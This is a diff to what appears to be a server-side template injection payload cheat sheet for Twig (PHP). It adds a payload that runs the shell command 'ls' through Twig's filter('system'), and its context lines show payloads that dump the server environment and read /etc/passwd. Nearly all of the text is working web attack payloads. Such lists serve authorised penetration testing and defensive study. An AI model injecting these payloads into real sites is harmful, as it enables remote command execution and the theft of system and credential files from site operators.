@@ -166,6 +166,7 @@ Twig (PHP)
 {{_self.env}}
 {{dump(app)}}
 {{app.request.server.all|join(',')}}
+{{['ls']|filter('system')}}
 
 #File read
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
